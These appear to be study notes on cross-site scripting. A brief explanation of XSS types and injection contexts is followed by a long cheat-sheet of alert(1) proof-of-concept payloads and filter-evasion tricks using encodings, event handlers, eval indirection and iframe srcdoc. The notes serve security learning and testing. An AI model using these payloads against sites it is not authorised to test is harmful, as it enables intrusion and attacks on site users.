# Cross-Site Scripting (XSS) Notes

## 1. What is XSS? It's a vulnerability that lets you inject malicious JavaScript code into a website. The site then displays or executes this code as if it were a natural part of the content.

## 2. Types of XSS

Reflected XSS: The script is reflected off the web server, such as in an error message or search result. It runs immediately when the victim clicks a specially crafted link (often through URL parameters).

Stored XSS (Persistent): The most dangerous type. The script is permanently stored on the target server (e.g., in a database, in a comment field, or user profile). It executes every time any user views the affected page.

DOM-based XSS: The vulnerability exists in client-side code rather than server-side code. The script doesn't necessarily go through the server; it is executed by modifying the "Document Object Model" (DOM) in the victim's browser.

## 3. Context Matters (Where is the Injection?) The payload depends entirely on where the input lands:

Inside Tags: e.g., <div>[Payload]</div>

Inside Attributes: e.g., <input value="[Payload]">

Inside JavaScript: e.g., var name = '[Payload]';

## 4. Payloads & Bypasses:
 . Basic Bypass Payloads

"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>

. Using HTML Entities

"><script>alert&#40;1&#41;</script>
"><img src=x onerror=alert&#40;1&#41;>
"><svg onload=&#97;lert(1)>
"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>


. Unicode Bypass

"><script>\u0061lert(1)</script>
"><img src=x onerror="\u0061lert(1)">

. Breaking Out of Attributes

"><img src=x onerror=alert(1)>
" onmouseover=alert(1) a="
' onfocus=alert(1) x='
javascript:alert(1)

. Case and Space Obfuscation

"><ScRiPt>alert(1)</ScRiPt>
"><script >alert(1)</script>
"><script>alert(1)//</script>

. Using Event Handlers

"><div onpointerdown=alert(1)>CLICK</div>
"><video autoplay onplay=alert(1)>
"><details open ontoggle=alert(1)>
"><marquee onstart=alert(1)>




. Indirect JavaScript Execution


"><script>eval('alert(1)')</script>
"><script>Function('alert(1)')()</script>
"><script>setTimeout('alert(1)',100)</script>
"><script>new Function`alert(1)`</script>


 . Using srcdoc, data: & iframe

<iframe srcdoc="<script>alert(1)</script>"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
